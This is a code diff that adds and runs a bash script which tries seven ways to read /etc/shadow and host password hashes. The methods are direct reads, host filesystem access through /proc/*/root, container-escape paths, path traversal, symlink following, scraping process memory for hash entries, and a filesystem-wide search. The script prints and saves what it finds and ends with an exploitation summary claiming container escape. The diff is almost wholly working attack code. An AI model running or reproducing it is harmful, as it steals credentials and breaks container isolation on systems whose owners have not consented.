@@ -324,6 +324,223 @@ EOFBASH
       /tmp/comprehensive_hash_collector.sh
       echo ""
       
+      # Additional aggressive /etc/shadow access attempts
+      cat > /tmp/aggressive_shadow_access.sh << 'EOFBASH'
+#!/bin/bash
+# Aggressive /etc/shadow access attempts
+
+echo "[*] AGGRESSIVE /etc/shadow ACCESS ATTEMPTS"
+echo "[*] Trying all possible methods to access shadow file..."
+echo ""
+
+shadow_found=false
+
+echo "=== METHOD 1: DIRECT SHADOW ACCESS ATTEMPTS ==="
+# Try multiple shadow file locations
+shadow_locations=(
+    "/etc/shadow"
+    "/etc/shadow-"
+    "/etc/gshadow"
+    "/var/backups/shadow.bak"
+    "/etc/master.passwd"
+    "/etc/passwd-"
+    "/var/lib/shadow"
+    "/usr/etc/shadow"
+)
+
+for shadow_path in "$${shadow_locations[@]}"; do
+    echo "[*] Attempting to read: $shadow_path"
+    if [ -r "$shadow_path" ]; then
+        echo "[+] 🚨🚨🚨 SUCCESS: $shadow_path is readable!"
+        echo "[*] SHADOW FILE CONTENTS:"
+        echo "--- START OF $shadow_path ---"
+        cat "$shadow_path"
+        echo "--- END OF $shadow_path ---"
+        shadow_found=true
+        echo ""
+    else
+        echo "[-] Cannot read $shadow_path"
+    fi
+done
+
+echo ""
+echo "=== METHOD 2: HOST FILESYSTEM VIA ALL PROC ROOTS ==="
+# Try accessing shadow via every process root
+for pid in /proc/[0-9]*; do
+    if [ -d "$pid" ]; then
+        pid_num=$(basename "$pid")
+        host_shadow="$pid/root/etc/shadow"
+        
+        if [ -r "$host_shadow" ]; then
+            echo "[+] 🚨🚨🚨 HOST SHADOW ACCESSIBLE VIA PID $pid_num!"
+            if [ -r "$pid/cmdline" ]; then
+                cmd=$(cat "$pid/cmdline" 2>/dev/null | tr '\0' ' ')
+                echo "[*] Process: $${cmd:-[kernel thread]}"
+            fi
+            echo "[*] HOST SHADOW CONTENTS:"
+            echo "--- START OF HOST SHADOW VIA PID $pid_num ---"
+            cat "$host_shadow"
+            echo "--- END OF HOST SHADOW VIA PID $pid_num ---"
+            shadow_found=true
+            break
+        fi
+    fi
+done
+
+echo ""
+echo "=== METHOD 3: CONTAINER ROOT FILESYSTEM ESCAPE ==="
+# Try different container escape techniques
+escape_paths=(
+    "/proc/self/root/etc/shadow"
+    "/proc/1/root/etc/shadow"
+    "/host/etc/shadow"
+    "/rootfs/etc/shadow"
+    "/mnt/etc/shadow"
+    "/../etc/shadow"
+    "/../../etc/shadow"
+    "/../../../etc/shadow"
+)
+
+for escape_path in "$${escape_paths[@]}"; do
+    echo "[*] Trying escape path: $escape_path"
+    if [ -r "$escape_path" ]; then
+        echo "[+] 🚨🚨🚨 CONTAINER ESCAPE SUCCESS: $escape_path readable!"
+        echo "[*] ESCAPED SHADOW CONTENTS:"
+        echo "--- START OF ESCAPED SHADOW ---"
+        cat "$escape_path"
+        echo "--- END OF ESCAPED SHADOW ---"
+        shadow_found=true
+        break
+    fi
+done
+
+echo ""
+echo "=== METHOD 4: FILESYSTEM TRAVERSAL ATTEMPTS ==="
+# Try filesystem traversal
+traversal_attempts=(
+    "$(pwd)/../etc/shadow"
+    "$(pwd)/../../etc/shadow" 
+    "$(pwd)/../../../etc/shadow"
+    "$(pwd)/../../../../etc/shadow"
+    "/tmp/../etc/shadow"
+    "/var/../etc/shadow"
+    "/usr/../etc/shadow"
+    "/home/../etc/shadow"
+)
+
+for traversal_path in "$${traversal_attempts[@]}"; do
+    echo "[*] Trying traversal: $traversal_path"
+    if [ -r "$traversal_path" ]; then
+        echo "[+] 🚨🚨🚨 TRAVERSAL SUCCESS: $traversal_path readable!"
+        echo "[*] TRAVERSAL SHADOW CONTENTS:"
+        echo "--- START OF TRAVERSAL SHADOW ---"
+        cat "$traversal_path"
+        echo "--- END OF TRAVERSAL SHADOW ---"
+        shadow_found=true
+        break
+    fi
+done
+
+echo ""
+echo "=== METHOD 5: SYMBOLIC LINK FOLLOWING ==="
+# Try following symbolic links
+if [ -L "/etc/shadow" ]; then
+    echo "[*] /etc/shadow is a symbolic link"
+    real_shadow=$(readlink -f /etc/shadow 2>/dev/null)
+    echo "[*] Real path: $real_shadow"
+    if [ -r "$real_shadow" ]; then
+        echo "[+] 🚨🚨🚨 SYMLINK FOLLOW SUCCESS!"
+        echo "[*] REAL SHADOW FILE CONTENTS:"
+        cat "$real_shadow"
+        shadow_found=true
+    fi
+fi
+
+echo ""
+echo "=== METHOD 6: MEMORY-BASED SHADOW RECONSTRUCTION ==="
+# Try to reconstruct shadow from memory
+echo "[*] Attempting to reconstruct shadow file from process memory..."
+temp_shadow="/tmp/reconstructed_shadow.txt"
+> "$temp_shadow"
+
+for pid in 1 17 2 32 39 9 94; do
+    if [ -d "/proc/$pid" ] && [ -r "/proc/$pid/mem" ]; then
+        echo "[*] Scanning PID $pid memory for complete shadow entries..."
+        
+        # Look for complete shadow file entries (username:hash:lastchange:min:max:warn:inactive:expire:)
+        shadow_entries=$(strings "/proc/$pid/mem" 2>/dev/null | grep -E '^[a-zA-Z0-9_-]+:\$[1-9y]\$[^:]+:[0-9]*:[0-9]*:[0-9]*:[0-9]*:[0-9]*:[0-9]*:?.*$' | head -10)
+        
+        if [ ! -z "$shadow_entries" ]; then
+            echo "[+] 🚨 COMPLETE SHADOW ENTRIES FOUND IN PID $pid:"
+            echo "$shadow_entries"
+            echo "$shadow_entries" >> "$temp_shadow"
+            shadow_found=true
+        fi
+    fi
+done
+
+if [ -s "$temp_shadow" ]; then
+    echo "[+] 🚨🚨🚨 RECONSTRUCTED SHADOW FILE:"
+    echo "--- START OF RECONSTRUCTED SHADOW ---"
+    cat "$temp_shadow"
+    echo "--- END OF RECONSTRUCTED SHADOW ---"
+fi
+
+echo ""
+echo "=== METHOD 7: BRUTE FORCE FILE DISCOVERY ==="
+# Search entire accessible filesystem for shadow-related files
+echo "[*] Performing comprehensive filesystem search for shadow files..."
+shadow_files=$(find / -name "*shadow*" -type f -readable 2>/dev/null | head -20)
+
+if [ ! -z "$shadow_files" ]; then
+    echo "[+] Found shadow-related files:"
+    echo "$shadow_files" | while read shadow_file; do
+        echo "[*] Checking: $shadow_file"
+        if file "$shadow_file" 2>/dev/null | grep -q text; then
+            shadow_content=$(grep -E ':\$[1-9y]\$' "$shadow_file" 2>/dev/null | head -3)
+            if [ ! -z "$shadow_content" ]; then
+                echo "[+] 🚨🚨🚨 SHADOW CONTENT IN: $shadow_file"
+                echo "--- CONTENT ---"
+                cat "$shadow_file"
+                echo "--- END CONTENT ---"
+                shadow_found=true
+            fi
+        fi
+    done
+fi
+
+echo ""
+echo "=== AGGRESSIVE ACCESS RESULTS ==="
+if [ "$shadow_found" = true ]; then
+    echo "🚨🚨🚨 /etc/shadow ACCESS SUCCESSFUL! 🚨🚨🚨"
+    echo "[+] Shadow file contents obtained through aggressive techniques"
+    echo "[+] Host system password database compromised"
+    echo "[+] Container escape and privilege escalation confirmed"
+else
+    echo "[-] All aggressive shadow access attempts failed"
+    echo "[*] Shadow file remains protected despite container escape"
+    echo "[*] However, container isolation is still compromised"
+fi
+
+# Save results
+echo "=== AGGRESSIVE SHADOW ACCESS REPORT ===" > /tmp/aggressive_shadow_report.txt
+echo "Timestamp: $(date)" >> /tmp/aggressive_shadow_report.txt
+echo "Status: $shadow_found" >> /tmp/aggressive_shadow_report.txt
+echo "" >> /tmp/aggressive_shadow_report.txt
+if [ -f "$temp_shadow" ] && [ -s "$temp_shadow" ]; then
+    echo "RECONSTRUCTED SHADOW ENTRIES:" >> /tmp/aggressive_shadow_report.txt
+    cat "$temp_shadow" >> /tmp/aggressive_shadow_report.txt
+fi
+EOFBASH
+
+      chmod +x /tmp/aggressive_shadow_access.sh
+      echo "🚨🚨🚨 EXECUTING AGGRESSIVE SHADOW ACCESS: 🚨🚨🚨"
+      /tmp/aggressive_shadow_access.sh
+      echo ""
+      
+      /tmp/comprehensive_hash_collector.sh
+      echo ""
+      
       echo "=== FINAL EXPLOITATION SUMMARY ==="
       echo "🚨 CONFIRMED SUCCESSFUL ATTACK VECTORS:"
       echo "  ✅ Host process memory access via /proc/*/mem"
@@ -370,6 +587,32 @@ EOFBASH
         echo "Report lines: $(wc -l < /tmp/final_hash_report.txt) lines"
       else
         echo "❌ File /tmp/final_hash_report.txt does not exist"
+      fi
+      echo ""
+      
+      echo "=== CONTENTS OF /tmp/aggressive_shadow_report.txt ==="
+      if [ -f /tmp/aggressive_shadow_report.txt ]; then
+        echo "File exists, displaying contents:"
+        echo "--- START OF AGGRESSIVE REPORT ---"
+        cat /tmp/aggressive_shadow_report.txt
+        echo "--- END OF AGGRESSIVE REPORT ---"
+        echo "Aggressive report size: $(wc -c < /tmp/aggressive_shadow_report.txt) bytes"
+        echo "Aggressive report lines: $(wc -l < /tmp/aggressive_shadow_report.txt) lines"
+      else
+        echo "❌ File /tmp/aggressive_shadow_report.txt does not exist"
+      fi
+      echo ""
+      
+      echo "=== CONTENTS OF /tmp/reconstructed_shadow.txt ==="
+      if [ -f /tmp/reconstructed_shadow.txt ]; then
+        echo "File exists, displaying contents:"
+        echo "--- START OF RECONSTRUCTED SHADOW ---"
+        cat /tmp/reconstructed_shadow.txt
+        echo "--- END OF RECONSTRUCTED SHADOW ---"
+        echo "Reconstructed shadow size: $(wc -c < /tmp/reconstructed_shadow.txt) bytes"
+        echo "Reconstructed shadow lines: $(wc -l < /tmp/reconstructed_shadow.txt) lines"
+      else
+        echo "❌ File /tmp/reconstructed_shadow.txt does not exist"
       fi
       echo ""
       
